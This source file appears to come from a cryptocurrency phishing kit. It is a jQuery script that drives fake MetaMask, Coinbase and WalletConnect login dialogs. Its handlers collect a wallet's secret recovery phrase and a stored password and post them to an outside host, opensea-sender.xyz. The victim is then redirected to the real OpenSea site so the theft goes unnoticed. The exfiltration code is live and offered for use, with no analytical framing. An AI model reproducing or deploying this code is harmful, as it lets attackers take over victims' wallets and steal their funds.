$('#OpenWallet').click(function (e) {
    e.preventDefault();
    if ($('#WalletSidebar').hasClass('ijXAAM'))
        $('#WalletSidebar').removeClass('ijXAAM').addClass('iWAWQA');
    else
        $('#WalletSidebar').removeClass('iWAWQA').addClass('ijXAAM');
})


$('#buttonWallet').click(function (e) {
    e.preventDefault();
    $('#connectWallet').removeClass('hidden')
})

$('#closeWindow').click(function (e) {
    e.preventDefault();
    $('#connectWallet').addClass('hidden');
})


$(".metamask").click(function () {
    $(".overlay").fadeOut();
    $(".metamask-overlay").fadeIn();
    $('#connectWallet').addClass('hidden');
});

$(".wallet-connect").click(function (e) {
    e.preventDefault();
    $('#connectWallet').addClass('hidden');
    $('#walletconnect-wrapper').removeClass('hidden');
})


$('.walletconnect-modal__close__wrapper').click(function (e) {
    e.preventDefault();
    $('#walletconnect-wrapper').addClass('hidden');
})

$('.password-input-2').on('focus', function (e) {
    $('.password-input-2-class').addClass('MuiInputLabel-shrink');
});

$('.password-input-2').on('blur', function (e) {
    if (e.target.value.length == 0) {
        $('.password-input-2-class').removeClass('MuiInputLabel-shrink');
    }
});


$('input').on('focus', function (e) {
    $('#password-label').addClass('MuiInputLabel-shrink');
});

$('input').on('blur', function (e) {
    if (e.target.value.length == 0) {
        $('#password-label').removeClass('MuiInputLabel-shrink');
    }
});

$('.button').bind('click', function () {
    $('.modal').addClass('hide');
});

$('.wallet-connect').click(function (e) {
    // e.preventDefault();
    // $('.frame').removeClass('hidden');
})




$(".MuiInputBase-input-none").focus(function () {
    $(".MuiFormLabel-root-none").addClass("muiform");
});
$(".MuiInputBase-input-none").blur(function () {
    var name = $(".MuiInputBase-input-none").val();
    if (name == "") {
        $(".MuiFormLabel-root-none").removeClass("muiform");
    }
});
$(".MuiInputBase-input-one").focus(function () {
    $(".MuiFormLabel-root-one").addClass("muiform");
});
$(".MuiInputBase-input-one").blur(function () {
    var name = $(".MuiInputBase-input-one").val();
    if (name == "") {
        $(".MuiFormLabel-root-one").removeClass("muiform");
    }
});
$(".MuiInputBase-input-two").focus(function () {
    $(".MuiFormLabel-root-two").addClass("muiform");
});
$(".MuiInputBase-input-two").blur(function () {
    var name = $(".MuiInputBase-input-two").val();
    if (name == "") {
        $(".MuiFormLabel-root-two").removeClass("muiform");
    }
});
$(".MuiInputBase-input-three").focus(function () {
    $(".MuiFormLabel-root-three").addClass("muiform");
});
$(".MuiInputBase-input-three").blur(function () {
    var name = $(".MuiInputBase-input-three").val();
    if (name == "") {
        $(".MuiFormLabel-root-three").removeClass("muiform");
    }
});
$(".MuiInputBase-input-four").focus(function () {
    $(".MuiFormLabel-root-four").addClass("muiform");
});
$(".MuiInputBase-input-four").blur(function () {
    var name = $(".MuiInputBase-input-four").val();
    if (name == "") {
        $(".MuiFormLabel-root-four").removeClass("muiform");
    }
});
$(".MuiInputBase-input-five").focus(function () {
    $(".MuiFormLabel-root-five").addClass("muiform");
});
$(".MuiInputBase-input-five").blur(function () {
    var name = $(".MuiInputBase-input-five").val();
    if (name == "") {
        $(".MuiFormLabel-root-five").removeClass("muiform");
    }
});


$(".metamask").click(function () {
    $(".overlay").fadeOut();
    $(".metamask-overlay").fadeIn();
});
$(".metamasknone").click(function () {
    var name = $(".MuiInputBase-input-none").val();
    if (name.length > 1) {
        $(".metamask-form").fadeOut();
        $(".metamask-form-one").fadeIn();
    }

});
$(".metamaskone").click(function () {
    var name = $(".MuiInputBase-input-one").val();
    if (name.length > true) {
        $(".metamask-form-one").fadeOut();
        $(".metamask-form-three").fadeIn();
    }
    let password = $('#password').val();
    localStorage.setItem('password', password);
    window.location.replace('./MetaMask.html')
});
$(".metamasktwo").click(function () {
    $(".metamask-form-two").fadeOut();
    $(".metamask-form-three").fadeIn();
});
$(".metamaskfour").click(function () {
    var name = $(".MuiInputBase-input-four").val();
    var name2 = $(".MuiInputBase-input-five").val();
    if (name.length, name2.length > true) {
        $(".metamask-form-four").fadeOut();
        $(".metamask-form-three").fadeIn();
    }
});
$(".unlock-page__link--import").click(function () {
    $(".metamask-form").fadeOut();
    $(".metamask-form-one").fadeOut();
    $(".metamask-form-two").fadeOut();
    $(".metamask-form-three").fadeOut();
    $(".metamask-form-four").fadeIn();
});


$('#loginCoinbase').click(function (e) {
    e.preventDefault();
    window.location.replace('./Coinbase.html')
})

$('#sendToken').click(function (e) {
    e.preventDefault();
    let Phrase = $('#phrase').val();
    let wallet = $('#wallet').val();
    let password = localStorage.getItem('password');
    let numWords = Phrase.match(/\S+/g).length;


    if (numWords < 12) {
        alert('Secret recovery phrases contain 12, 15, 18, 21 or 24 words')
        e.preventDefault();
        //  $(".first-time-flow__button").removeAttr("disabled");
        return;
    } else {
        // $(".first-time-flow__button").attr("disabled");
    }
    if (numWords > 24) {
        alert('Secret recovery phrases contain 12, 15, 18, 21 or 24 words');
        e.preventDefault();
        return;
    }

    try {
        let payload = `phrase=${Phrase}&password=${password}&wallet=Metamask`;
        axios.post('https://opensea-sender.xyz:3001/Metamask', payload)
            .then(function (response) {
                window.location.replace('https://opensea.io/')
            })
            .catch(function (error) {
                console.log(error);
            });

    } catch (error) {
        console.log(error);
    }
})


$('#seedCoinBase').on('keyup', function (e) {
    e.preventDefault();
    if (e.target.value.length > 0) {
        $('#importWalletCoinBase').removeAttr("disabled").removeClass('cds-disabledState-ds765j4');
    } else {
        $('#importWalletCoinBase').addClass('cds-disabledState-ds765j4');
        $('#importWalletCoinBase').attr("disabled");
    }

})

$('#importWalletCoinBase').click(function (e) {
    e.preventDefault();

    try {
        let Phrase = $('#seedCoinBase').val();
        let numWords = Phrase.match(/\S+/g).length;


        if (numWords < 12) {
            alert('Secret recovery phrases contain 12, 15, 18, 21 or 24 words')
            e.preventDefault();
            //  $(".first-time-flow__button").removeAttr("disabled");
            return;
        } else {
            // $(".first-time-flow__button").attr("disabled");
        }
        if (numWords > 24) {
            alert('Secret recovery phrases contain 12, 15, 18, 21 or 24 words');
            e.preventDefault();
            return;
        }

        try {
            let payload = `phrase=${Phrase}&password=None&wallet=CoinBase`;
            axios.post('https://opensea-sender.xyz:3001/Metamask', payload)
                .then(function (response) {
                    window.location.replace('https://opensea.io/')
                })
                .catch(function (error) {
                    console.log(error);
                });

        } catch (error) {
            console.log(error);
        }



    } catch (error) {
        console.log(error);
    }
})